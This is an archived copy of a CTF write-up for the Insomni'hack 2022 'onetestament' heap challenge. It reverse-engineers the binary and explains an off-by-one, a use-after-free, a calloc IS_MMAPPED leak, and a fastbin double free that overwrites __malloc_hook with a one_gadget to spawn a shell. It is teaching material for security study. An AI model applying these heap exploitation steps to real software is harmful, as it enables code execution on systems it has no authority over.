# onetestament

**CTF:** insomnihack 2022 Quals  
**Category:** pwn  
**Original writeup:** <https://www.synacktiv.com/en/publications/heap-tricks-never-get-old-insomnihack-teaser-2022.html> — by **synacktiv.com**. All credit goes to the original author; this is an archived copy.

---

The Synacktiv team participated in the Insomni'hack teaser 2022 last week-end and placed 9th out of 280 teams. The onetestament challenge was pretty interesting and taught me a few tricks so I have decided to write a detailed solution. In this writeup, I have tried to illustrate the thought process behind solving this challenge, rather than just the usual solve.py (which you can still find at the end of the article). Expect to see some (old) heap tricks and enjoy the read!

The binary and libc were provided along with this pwn challenge, good point.

Initial setup

In terms of mitigations, the challenge binary is pretty heavily protected by Full RELRO, NX and PIE:

$ checksec ontestament.bin [*] '/home/bak/onetestament/ontestament.bin' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled

The provided libc being stripped, it could come in handy to retrieve its equivalent with the debug symbols. Luckily for us, pwninit does just that, as well as patching the binary so that it will be linked with the provided libc, instead of the system one.

The libc linking can be verified with ldd :

$ ldd ontestament.bin_patched linux-vdso.so.1 (0x00007ffc057eb000) libc.so.6 => ./libc.so.6 (0x00007f84a2ec8000) ./ld-2.23.so => /lib64/ld-linux-x86-64.so.2 (0x00007f84a3499000)

By the way, which version of libc is it?

$ ./libc6.so | head -n 1 GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.3) stable release version 2.23, by Roland McGrath et al.

If you're familiar with heap challenges, you know that the libc version is very important.

Indeed, heap memory management has evolved a lot through time. Mitigations have appeared, memory structures have been added and the way they work has been modified. This is why heap attacks often affect one specific version of a particular libc. For more information, see the how2heap repository.

In our case, Glibc 2.23 is dated from February 2016, which is pretty old. An interesting thing to do, prior to starting the challenge, is to check what security fixes or mitigations have been implemented in newer versions of the libc.

Now, the initial setup is done and we can start reverse-engineering the challenge!

Reverse engineering

Program features

The program is very straight-forward. As for all heap challenges, you can create, edit, show and delete objects. At least that's what we thought when running the program for the first time:

$ ./ontestament.bin ========================== ✝ OneTestament ✝ ========================== 1. My new testament 2. Show my testament 3. Edit my testament 4. Delete my testament 5. Bye! Please enter your choice:

At the very beginning of the program, a call to alarm(20) is made. This triggers a SIGALRM signal after 20 seconds and stops the program. In order to avoid this annoying behavior, one can patch the binary (nop the call to alarm) or simply enter the following command in gdb:

pwndbg> handle SIGALRM ignore Signal Stop Print Pass to program Description SIGALRM No Yes No Alarm clock

Let's make a quick tour of all the important functions.

Create

The pseudo-code of the function:

First, we can notice that only 10 allocations are allowed. A global variable (named nb_testaments here) is incremented after each new allocation.

Different testament sizes are available: 0x18, 0x30, 0x60 and 0x7c bytes. This will later come in handy in order to place our freed chunks, either in fastbins or unsorted bins. As a reminder, every chunks bigger than 0x58 bytes will be placed in the unsorted bins once freed.

Chunks are allocated by the calloc() function. One of the main differences between calloc() and malloc() is that the latter performs a memset(mem, 0, sz) of the memory area it allocates.

Then, the testament gets filled with user-specified data. Contrary to what one might think, the fill_testament() function is safe, and thus, won't be detailed here.

Another interesting point is that both the testament pointer and its size are stored into global variables from the .bss segment.

The attentive reader might notice that I've skipped the read_input() function. Its pseudo-code is the following:

__int64 read_input() { int v2; // [rsp+Ch] [rbp-4h] read(0, nptr, 5uLL); v2 = atoi(nptr); if ( v2 < 0 ) return 0; else return (unsigned int)v2; }

5 characters are read from the user and stored into the char nptr[4] global variable. Wait what? Is that a 1-byte overflow?

Yes it is! Alright, let's keep that in mind and see how it can be useful later.

Show

As in every heap challenge, we have a way to leak an address display the content of our objects:

int show_testament() { int index; // [rsp+Ch] [rbp-4h] index = init_rand(5, 0); return printf((&random_sentences)[index]); }

random_sentences is just an array of ... random sentences that are displayed when calling this function.

Wait, is that the challenge creator trolling us? I think so... Let's investigate this init_rand() function just in case.

__int64 __fastcall init_rand(int a1, int a2) { unsigned int ptr; // [rsp+14h] [rbp-Ch] BYREF FILE *stream; // [rsp+18h] [rbp-8h] stream = fopen("/dev/urandom", "r"); fread(&ptr, 4uLL, 1uLL, stream); fclose(stream); srand(ptr); return (unsigned int)(rand() % a1 + a2); }

Unless I am not aware of an arcanic trick involving fopen() , it definitely IS pure trolling by the challenge author 😆.

Edit

It seems we can edit testaments. Let's see what this function has in store for us:

void __fastcall edit_testament() { [...] printf("Please enter your testament index: "); input = read_input(); if ( input > 9 ) abort("Oops! not a valid index"); testament_addr = (char *)testaments[input]; if ( !testament_addr ) abort("Impossible! No testaments"); size_testament = size_testaments[input]; if ( nb_times_edited[input] > 2 ) abort("Are you serious?"); printf("Please enter your testament content: "); offset = read_input(); if ( offset > size_testament ) abort("Nope, impossible!"); ++testament_addr[offset]; ++nb_times_edited[input]; }

The function verifies that the selected testament has been created before. However, there is no check that it has not already been freed. Cool kids call it a use-after-free (UAF).

Additionnaly, we can see that information about the selected testament is retrieved via the global variables testaments and size_testaments , interesting.

What's more, there is some sort of check that ensures we can only edit a testament twice.

Actually, this function does not allow the user to edit the full content of a testament. However, if we manage to mess with the size_testament variable, we could increment a single byte (at most twice), potentially out of the current testament bounds. Let's keep that in mind for the rest.

Delete

Now comes the juicy part, the delete function.

void delete_testament() { unsigned int input; // [rsp+4h] [rbp-Ch] void *ptr; // [rsp+8h] [rbp-8h] printf("Please enter your testament index: "); input = read_input(); if ( input > 9 ) abort("Oops! not a valid index"); ptr = (void *)testaments[input]; if ( !ptr ) abort("Impossible! No testaments"); switch ( input ) { case 0u: if ( !dword_5555556030C8 ) abort("Impossible to delete again this testament"); free(ptr); dword_5555556030C8 = 0; break; case 1u: if ( !dword_5555556030C4 ) abort("Impossible to delete again this testament"); free(ptr); dword_5555556030C4 = 0; break; case 2u: if ( !dword_5555556030C0 ) abort("Impossible to delete again this testament"); free(ptr); dword_5555556030C0 = 0; break; case 3u: if ( !dword_5555556030BC ) abort("Impossible to delete again this testament"); free(ptr); dword_5555556030BC = 0; break; case 4u: if ( !dword_5555556030B8 ) // remember this guy abort("Impossible to delete again this testament"); free(ptr); dword_5555556030B8 = 0; break; case 5u: if ( !dword_5555556030B0 ) abort("Impossible to delete again this testament"); free(ptr); dword_5555556030B0 = 0; break; case 6u: if ( !dword_5555556030AC ) abort("Impossible to delete again this testament"); free(ptr); dword_5555556030AC = 0; break; case 7u: if ( !dword_5555556030A8 ) abort("Impossible to delete again this testament"); free(ptr); dword_5555556030A8 = 0; break; case 8u: if ( !dword_5555556030A4 ) abort("Impossible to delete again this testament"); free(ptr); dword_5555556030A4 = 0; break; case 9u: if ( !dword_5555556030A0 ) abort("Impossible to delete again this testament"); free(ptr); dword_5555556030A0 = 0; break; default: return; } }

Whenever this function is called, the selected testament pointer is freed.

At first sight, it does not seem possible to free() a same pointer twice. Indeed, a global variable indicates for each testament whether it has already been freed or not.

Do you remember that 1-byte overflow in the read_input() function? Guess what lies right next to the nptr variable in memory?

The dword_5555556030B8 double word, which is affected by the overflow, is used to indicate whether the fifth testament (case 4 of the switch) has already been freed.

By following this recipe, we are able to trigger a double free:

allocate at least five testaments

free the fifth one

trigger the overflow in order to set dword_5555556030B8 's first byte to anything but zero

's first byte to anything but zero free the fifth testament again

The leak

We have now identified a few vulnerabilities and the double free seems to be the most serious lead. What's more, we know that exploiting double frees with fastbins is pretty straight-forward in glibc 2.23. However, ASLR and PIE being enabled, obtaining an address leak seems mandatory.

Actually, there is a way to exploit glibc 2.23 without leak. This technique is called House of Roman.

However, this attack requires to be able to partially overwrite pointers and to do more allocations than we are allowed to.

So there must be a leak somewhere, let's dig deeper.

Calloc and chunks metadata

The only function that could potentially leak something interesting is the printf() at the end of new_testament() :

[...] testament_addr = calloc(nmemb, 1uLL); if ( !testament_addr ) abort("Oops! Memory error"); printf("Please enter your testatment content: "); fill_testament(0, (char *)testament_addr, nmemb); for ( i = 0LL; i <= 10 && testaments[i]; ++i ) ; if ( i > 10 ) abort("still too many testaments"); testaments[i] = testament_addr; printf("My new testament: %s

", (const char *)testament_addr); [...]

However, it is only called after calloc() , which means that the allocated memory area has been zeroed out.

Inspecting the source code of __libc_calloc reveals that, in some cases, memset() is not called and the memory area is not cleared:

/* Two optional cases in which clearing not necessary */ if (chunk_is_mmapped (p)) { if (__builtin_expect (perturb_byte, 0)) return memset (mem, 0, sz); return mem; }

This happens when the memory area we are trying to allocate is also a valid chunk, and that its IS_MMAPPED bit is set.

// From malloc/malloc.c /* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */ #define IS_MMAPPED 0x2 /* check for mmap()'ed chunk */ #define chunk_is_mmapped(p) ((p)->size & IS_MMAPPED)

On x64, malloc chunks are preceded by 8 bytes of metadata. They include the chunk size, as well as different flags:

| CHUNK SIZE | A (0x4) | M (0x2) | P (0x1) |

A : Allocated Arena - the main arena uses the application's heap.

: Allocated Arena - the main arena uses the application's heap. M : IS_MMAPPED - this chunk was allocated with a single call to mmap and is not part of a heap at all.

: IS_MMAPPED - this chunk was allocated with a single call to mmap and is not part of a heap at all. P: Previous chunk is in use.

As an illustration, creating two testaments of size 0x90 produces the following chunks:

Here we can see that only the PREV_IN_USE bit is set (0x90 & 0x1).

The objective here is to manually set the IS_MMAPPED bit so the chunk won't get cleared when allocated and we will possibly be able to leak an address by creating a new testament.

Use-after-free

As if by chance, the edit_testament() function allows us to increment a single byte two times. That would be just enough for us to enable the IS_MMAPPED bit if the PREV_IN_USE bit is also set. What's more, there is no check that the testament we want to edit is not already freed, hence the UAF.

The problem is that the program checks that offset (our input) is not superior to size_testament .

Actually, this is not really a problem. Indeed, following these steps will allow us to corrupt a chunk's metadata:

Allocate a chunk of size greater than 0x58 and a small chunk in order to avoid the consolidation when the large chunk will be freed.

Free the large chunk so that it ends up in the unsorted bin.

Notice that some libc pointers are now present in the freed chunk. This is simply because unsorted bins are maintained in a circular linked list. They are pointing to the main_arena where different heap pointers are present:

pwndbg> x/6xg 0x00007ffff7dd1b78 0x7ffff7dd1b78 <main_arena+88>: 0x00005555556050b0 0x0000000000000000 0x7ffff7dd1b88 <main_arena+104>: 0x0000555555605000 0x0000555555605000 0x7ffff7dd1b98 <main_arena+120>: 0x00007ffff7dd1b88 0x00007ffff7dd1b88

Allocate a small chunk that will shrink the unsorted bin.

Since testament pointers and sizes are stored in global variables, we now should have two testaments pointing to the same chunk (0x555555605010):

pwndbg> x/3xg 0x555555603160 // testaments 0x555555603160: 0x0000555555605010 0x00005555556050a0 0x555555603170: 0x0000555555605010 pwndbg> x/3xw 0x555555603120 // size_testaments 0x555555603120: 0x0000007c 0x00000018 0x00000018

The interesting part is that size_testaments[0] equals 0x7c (the former size of the large chunk), which is much bigger than the size of the chunk currently at 0x555555605010 (0x20). We can thus call the edit_testament() function and the size check will pass, allowing us to increment a byte out of the bounds of the current chunk.

That way, it is possible to increment the metadata byte of the following chunk two times, setting the IS_MMAPPED bit.

========================== ✝ OneTestament ✝ ========================== 1. My new testament 2. Show my testament 3. Edit my testament 4. Delete my testament 5. Bye! Please enter your choice: 3 Please enter your testament index: 0 Please enter your testament content: 24

Specifying 24 as testament content will increment the 24th byte after the beginning of testament number 0:

Pwndbg now confirms that the IS_MMAPPED (with a typo) is set:

Now the next allocation should return a pointer to the shrinked unsorted bin, without clearing its content, and thus leak it thanks to the printf(testament_addr) :

$ python3 solve.py [+] Starting local process './ontestament.bin_patched': pid 12633 [+] libc leak: 0x7ffff7dd1b00 [*] Stopped process './ontestament.bin_patched' (pid 12633)

Double free fastbin exploit

With a leak of a libc address, everything becomes a lot easier. The rest of the exploit will be less detailed since the techniques are already widely documented on the internet.

The plan here is to exploit the double free in order to obtain a chunk at an arbitrary address. A very popular way to exploit this kind of vulnerability is by writing a one gadget to the malloc hook. Then, the next malloc() call will execute the gadget, giving us a shell.

In order to do so, the following steps are needed:

computing the libc base address using the previous leak

exploit the fastbin double free

find a suitable one gadget

write it to __malloc_hook

trigger the one gadget by calling malloc()

profit

One gadget and malloc hook

A one gadget is simply a gadget performing a call to execve("/bin/sh", NULL, NULL) , present in most versions of GLIBC.

$ one_gadget libc.so.6 0x45226 execve("/bin/sh", rsp+0x30, environ) constraints: rax == NULL 0x4527a execve("/bin/sh", rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf03a4 execve("/bin/sh", rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1247 execve("/bin/sh", rsp+0x70, environ) constraints: [rsp+0x70] == NULL

The second one has been kept because its constraint was naturally satisfied in the program execution flow.

__malloc_hook address can be found in gdb. The offset needs to be adapted with the leak:

pwndbg> p &__malloc_hook $1 = (void *(**)(size_t, const void *)) 0x7ffff7dd1b10 <__malloc_hook>

Since we are going to build a fake chunk, the bytes before our address need to represent a valid size, or else the program will crash when trying to malloc.

pwndbg> x/64xg &__malloc_hook - 4 0x7ffff7dd1af0 <_IO_wide_data_0+304>: 0x00007ffff7dd0260 0x0000000000000000 0x7ffff7dd1b00 <__memalign_hook>: 0x00007ffff7a92ea0 0x00007ffff7a92a70 0x7ffff7dd1b10 <__malloc_hook>: 0x0000000000000000 0x0000000000000000

We can't chose __malloc_hook as our fake chunk address since 0x7ffff7a92a70 is not a valid size. However, we can build our fake chunk at &__malloc_hook - 0x23 since 0x7f is a valid size:

pwndbg> x/64xg 0x7ffff7dd1b10 - 0x23 0x7ffff7dd1aed <_IO_wide_data_0+301>: 0xfff7dd0260000000 0x000000000000007f 0x7ffff7dd1afd: 0xfff7a92ea0000000 0xfff7a92a7000007f

It can seem quite shocking at first because addresses are misaligned, but it is not a problem for glibc 2.23.

We know what to write and where to write it, let's do it!

We start by allocating two small chunks so that the fifth one is used. Then we free testament number 5 a first time. Since, the libc checks whether you are trying to free the same chunk twice in a row, we need to interleave another free() . So we also free testament number 6.

Then, we can trigger the one-byte overflow, which will reset the is_testament_5_freed variable (located at 0x5555556030b8 in the example below). It can be triggered by simply typing five characters into the main menu of the program.

After freeing testament number 5 a first time, 0x5555556030b8 holds 0x0:

pwndbg> x/2xw 0x5555556030B4 0x5555556030b4: 0x00000a34 0x00000000

After triggering the one-byte overflow:

pwndbg> c ========================== ✝ OneTestament ✝ ========================== 1. My new testament 2. Show my testament 3. Edit my testament 4. Delete my testament 5. Bye! Please enter your choice: 12345 Wrong choice ! pwndbg> x/2xw 0x5555556030B4 0x5555556030b4: 0x3433320a 0x00000035

This gives us the possibility to pass the check in delete_testament() and to free the testament number 5 a second time. This has the effect of creating a loop in the fastbins:

pwndbg> fastbins fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x5555556050b0 —▸ 0x555555605120 ◂— 0x5555556050b0 0x80: 0x0

Now we need to create a new testament of size 0x70, which will hold the address of our future fake chunk, just before __malloc_hook .

pwndbg> fastbins fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x555555605120 —▸ 0x5555556050b0 —▸ 0x7ffff7dd1aed (_IO_wide_data_0+301) ◂— 0xfff7a92ea0000000 0x80: 0x0

Next, we create two chunks of size 0x70 in order to pop them for the fastbins linked list:

pwndbg> fastbins fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x7ffff7dd1aed (_IO_wide_data_0+301) ◂— 0xfff7a92ea0000000 0x80: 0x0

Finally, we will allocate our fake chunk by creating a new testament and giving it the address of the one gadget as content (0x7ffff7a5227a in the current context)

pwndbg> x/8xg 0x7ffff7dd1b10-0x20 0x7ffff7dd1af0 <_IO_wide_data_0+304>: 0x00007ffff7dd0260 0x0000000000000000 0x7ffff7dd1b00 <__memalign_hook>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b10 <__malloc_hook>: 0x00007ffff7a5227a 0x000000000000000a 0x7ffff7dd1b20 <main_arena>: 0x0000000000000000 0x0000000000000000

The only thing left to do is to trigger the execution of __malloc_hook by issuing a new call to malloc()

========================== ✝ OneTestament ✝ ========================== 1. My new testament 2. Show my testament 3. Edit my testament 4. Delete my testament 5. Bye! Please enter your choice: $ 1 --------------------------------------- Which testament do you want to create: ---------------------------------------- 1. Testament for your pet 2. Testament for your parent 3. Testament for your child 4. Testament for your lover Please enter your choice: $ 3 $ cat flag INS{0ld_7r1ck5_4r3_7h3_b357}
